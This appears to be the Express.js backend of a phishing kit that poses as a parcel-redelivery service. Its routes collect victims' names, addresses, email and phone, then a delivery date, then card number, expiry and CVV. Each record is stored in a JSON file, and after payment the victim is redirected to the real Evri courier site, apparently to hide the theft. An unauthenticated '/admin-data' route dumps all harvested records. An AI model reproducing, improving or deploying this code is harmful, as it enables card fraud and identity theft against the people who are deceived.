const express = require('express');
const fs = require('fs');
const bodyParser = require('body-parser');
const app = express();

// If you are on Render with a disk, you can use /data/data.json instead
const dataFile = 'data.json';

app.use(express.static('public'));
app.use(bodyParser.urlencoded({ extended: true }));

function loadData() {
  if (!fs.existsSync(dataFile)) return [];
  try {
    const raw = fs.readFileSync(dataFile);
    const parsed = JSON.parse(raw);
    return Array.isArray(parsed) ? parsed : [];
  } catch (e) {
    return [];
  }
}

function saveData(data) {
  fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
}

// STEP 1 – create new record
app.post('/details', (req, res) => {
  const data = loadData();

  const entry = {
    firstName: req.body.firstName,
    lastName: req.body.lastName,
    addr1: req.body.addr1,
    addr2: req.body.addr2,
    postcode: req.body.postcode,
    email: req.body.email,
    phone: req.body.phone
  };

  data.push(entry);          // append, never replace
  saveData(data);
  res.redirect('/selectdate.html');
});

// STEP 2 – update last record with delivery date
app.post('/delivery-date', (req, res) => {
  const data = loadData();
  if (data.length === 0) {
    return res.redirect('/redelivery.html');
  }
  data[data.length - 1].deliveryDate = req.body.deliveryDate;
  saveData(data);
  res.redirect('/payment.html');
});

// STEP 3 – update last record with card info + timestamp
app.post('/payment', (req, res) => {
  const data = loadData();
  if (data.length === 0) {
    return res.redirect('/redelivery.html');
  }

  const last = data[data.length - 1];
  last.cardnum   = req.body.cardnum;
  last.exp       = req.body.exp;
  last.cvv       = req.body.cvv;
  last.submitted = new Date().toISOString();

  saveData(data);
  res.redirect('https://www.evri.com/');
});

// ADMIN API – return ALL records (no 30‑day filter for now)
app.get('/admin-data', (req, res) => {
  const data = loadData();
  res.json(data);
});

// Start server (change port if you use 3000 instead)
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
